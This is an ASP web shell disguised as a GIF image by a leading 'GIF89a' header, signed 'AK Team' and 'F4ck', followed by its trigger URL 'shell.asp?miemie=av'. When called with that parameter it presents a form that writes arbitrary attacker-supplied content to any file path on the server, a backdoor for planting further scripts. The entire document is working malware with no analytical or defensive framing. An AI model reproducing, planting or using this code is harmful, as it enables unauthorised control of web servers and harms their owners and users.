GIF89a$       ;<hTml>
<% if request("miemie")="av" then %>
<%
on error resume next
testfile=Request.form("2010")
if Trim(request("2010"))<>"" then
set fs=server.CreateObject("scripting.filesystemobject")
set thisfile=fs.CreateTextFile(testfile,True)
thisfile.Write(""&Request.form("1988") & "")
if err =0 Then
response.write"<font color=red>Success</font>"
else
response.write"<font color=red>False</font>"
end if
err.clear
thisfile.close
set fs = nothing
End if
%>
<style type="text/css">
<!--
#Layer1 {
    position:absolute;
    left:500px;
    top:404px;
    width:118px;
    height:13px;
    z-index:7;
}
.STYLE1 {color: #9900FF}
-->
</style>
<title>Welcome To AK Team</title>
<form method="POST" ACTION="">
<input type="text" size="54" name="2010"
value="<%=server.mappath("akt.asp")%>"> <BR>
<TEXTAREA NAME="1988" ROWS="18" COLS="78"></TEXTAREA>
<input type="submit" name="Send" value="GO!">
<div id="Layer1">- BY F4ck</div>
</form>
<% end if %>
</hTml>

shell.asp?miemie=av